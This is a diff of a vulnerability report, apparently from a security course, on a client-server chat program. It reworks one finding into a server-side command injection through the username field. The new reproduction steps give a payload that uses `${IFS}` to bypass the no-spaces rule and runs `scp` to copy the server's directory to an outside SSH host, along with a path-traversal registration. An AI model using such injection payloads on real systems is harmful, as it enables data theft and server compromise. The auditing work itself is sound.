@@ -169,28 +169,29 @@ The vulnerability was found in the code, and would be abused, according to the t
 **How it was found:** \
 It was found while looking through the client sending a message function, where the goal was to find how the message is safeguarded from being read while on the network.
 
-<!-- 2 + 1 + 1 = 4 -->
+<!-- 2 + 2.5 + 2 = 6.5 -->
 
 ## Vulnerability 6
 
 **Program nummber:** 2
 
-**Type of a vulnerability:** other - writing a file into a unauthorized directory
+**Type of a vulnerability:** command injection
 
 **Impact of a vulnerability:**
 
-- [x] None - this vulnerability does not impact availability, data integrity or security, but it completes an action that is not supposed to take place.
+- [ ] None
 - [ ] Loss of availability
-- [ ] Data leak
-- [ ] Data corruption
+- [x] Data leak - server unknowingly can send its data to Mallory
+- [x] Data corruption - server can be corrupted through command injection
 - [ ] Code execution
 
 **Cause:** not sanitizing username on the server side. There is an assumption, that the username is only alphanumeric characters, when it is sent to the server, because it does this check in the client side (client.c client_process_command() lines 105-111), but if the client is malicious, i.e. these lines are removed, the server generates client keys with their username (worker.c execute_request() line 282, rsa.c generate_keys() line 85 and 89 `sprintf(command, "openssl genrsa -out clientkeys/%s-private-key.pem 2048 > /dev/null 2>&1", username);`)
 
 **Steps to reproduce:** \
 Create a malicious client by removing lines 105-111 in client.c file, which check if the username has non-alphanumeric characters. \
-Use command `/register ../../.. password` \
-Check the dirrectory, where the 'program' folders are to have the client key pair.
+To inject a command, username cannot have spaces in its name, therefore spaces need to be replaced with `${IFS}` characters. Example of data leak can be copying current directory into a Mallory controlled ssh server, which does not need authentification. (Example registration (but this one needs authentification): `/register scp${IFS}-r${IFS}.${IFS}mrs368@ssh.data.vu.nl: test`).
+Also, this vulnerability allows to write the RSA key pair into any directory on the server, example of this `/register ../../.. password` \
+If the command or the given path are too long such that the client says "error: invalid command format", it is possible to disable this check in the client by removing lines 101-104 in the client.c file. Since this check is only in the client, the malicious client can inject even more elaborate command in the server.
 
 **How it was found:** \
 It was found when I noticed that there is a shell system call with the string formatter in the rsa.c, which uses the username. After trying to use `../` blocks to traverse the path back to unexpected directories, I was not able to do so because of the check for alphanumeric characters. However, this check is on the client side only, thus, after having modified the client to be malicious, I was able to traverse directories on the server side.
@@ -286,26 +287,3 @@ _Location_:
 
 **How it was found:** \
 
-<!-- 2 + 2 + 1 = 5 -->
-
-## Vulnerability 10
-
-**Program nummber:** 2
-
-**Type of a vulnerability:** shell command injection
-
-**Impact of a vulnerability:**
-
-- [x] None
-- [ ] Loss of availability
-- [ ] Data leak
-- [ ] Data corruption
-- [ ] Code execution
-
-**Cause:** unescapped shell special characters in the username can be used to run an environment variables 
-
-_Location_:
-
-**Steps to reproduce:** \
-
-**How it was found:** \
